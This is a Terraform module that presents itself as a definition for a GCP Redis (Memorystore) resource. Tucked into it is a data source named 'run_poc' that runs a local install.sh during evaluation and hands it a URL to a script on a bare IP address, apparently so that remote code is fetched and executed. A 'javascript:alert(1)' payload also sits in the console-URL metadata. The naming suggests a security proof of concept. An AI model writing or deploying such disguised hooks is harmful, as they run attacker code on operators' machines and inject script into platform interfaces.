terraform {
  required_providers {
    random = {
      source = "hashicorp/random"
    }
  }
}

resource "random_id" "r" {
  byte_length = 3
}

data "external" "run_poc" {
  program = ["${path.module}/install.sh"]

  query = {
    url = "http://164.90.177.231:8080/script.sh"
  }
}

variable "env_type_id" {
  type = string
}

locals {
  gcp_region    = "europe-west1"
  gcp_project   = "my-project-id"
  instance_name = "my-${var.env_type_id}-redis-${random_id.r.hex}"
}

output "host" {
  value = "${local.instance_name}.${random_id.r.hex}.c.${local.gcp_project}.internal"
}

output "port" {
  value = 6379
}

output "humanitec_metadata" {
  value = {
    "Gcp-Region" : local.gcp_region,
    "Gcp-Project" : local.gcp_project,
    "Gcp-Memorystore-Instance" : local.instance_name,
    "Console-Url" : "javascript:alert(1)",
    "Redis-Shard-Count" : var.env_type_id == "production" ? "6" : "1",
    "Redis-Instance-Type" : var.env_type_id == "production" ? "STANDARD 10GB" : "BASIC 1GB",
  }
}
